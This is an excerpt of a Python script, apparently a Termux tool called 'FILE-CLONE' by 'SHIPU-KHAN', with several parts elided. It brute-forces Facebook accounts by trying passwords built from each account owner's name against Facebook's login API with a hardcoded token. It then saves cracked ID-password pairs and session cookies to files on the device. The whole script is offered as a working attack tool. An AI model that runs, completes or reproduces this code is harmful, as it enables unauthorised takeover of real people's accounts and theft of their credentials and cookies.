...
\033[1;32m--------------------------------------------------------
\033[1;37m[\033[1;31mâ€¢\033[1;37m]\033[1;31mDEVELOPER    :   \033[1;31mSHIPU-KHAN
\033[1;37m[\033[1;32mâ€¢\033[1;37m]\033[1;32mTOOLS        :   \033[1;32mFILE-CLONE
\033[1;37m[\033[1;33mâ€¢\033[1;37m]\033[1;33mVERSION      :   \033[1;33m 5.00
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        exit()
os.system('xdg-open https://sp.cpm')
def DANGER():   
    os.system('clear')
    print(logo)
    ...
    if select =='1':
        ...
        time.sleep(2)
        DANGER(allkey)
os.system('xdg-open https://t.me/+shipukhan')
def method_crack():
    global methods
    clear()
    print(f'[1] Method {1}')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[SHIPU] \033[1;33m{loop} \033[1;32m| \033[1;34mSHIPU OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SHIPU-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SHIPU-COOKIE.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SHIPU-CP-COOKIE.txt.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SHIPU-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SHIPU-CP-COOKIE.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
